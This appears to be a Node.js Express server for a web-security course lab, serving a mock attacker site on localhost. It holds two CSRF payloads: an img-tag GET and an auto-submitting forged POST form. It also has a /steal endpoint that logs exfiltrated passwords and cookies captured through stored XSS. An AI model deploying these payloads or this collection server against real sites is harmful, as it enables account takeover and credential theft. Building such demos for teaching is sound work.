const express = require('express');

const app = express();

// Local-only attacker site for coursework demonstrations.
app.get('/', (_req, res) => {
  res.type('html').send(`<!doctype html>
  <title>External Site</title>
  <h1>External Site</h1>
  <p>This local page automatically requests the legacy Account Settings endpoint.</p>
  <img src="http://localhost:3000/settings/legacy-update?email=attacker%40sentinel.test" alt="tracking image">
  <p>Return to Sentinel Workspace to observe the account email change.</p>`);
});

// Simulates a forged POST request. It deliberately omits the anti-forgery token.
app.get('/secure-attempt', (_req, res) => {
  res.type('html').send(`<!doctype html>
  <title>External Site</title>
  <h1>External Site</h1>
  <p>Attempting an account update without the required anti-forgery token.</p>
  <form id="forged-request" method="post" action="http://localhost:3000/settings/secure-update">
    <input type="hidden" name="email" value="attacker@sentinel.test">
  </form>
  <script>document.getElementById('forged-request').submit();</script>`);
});

// Endpoint to capture exfiltrated data (passwords, cookies) from Stored XSS
app.get('/steal', (req, res) => {
  const credential = req.query.pass || req.query.data || req.query.cookie || 'No credential provided';
  console.log(`🚨 [ATTACKER TERMINAL - Port 4000] STOLEN CREDENTIAL RECEIVED: "${credential}"`);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.send('Captured by attacker');
});

app.listen(4000, () => console.log('External attacker site: http://localhost:4000'));
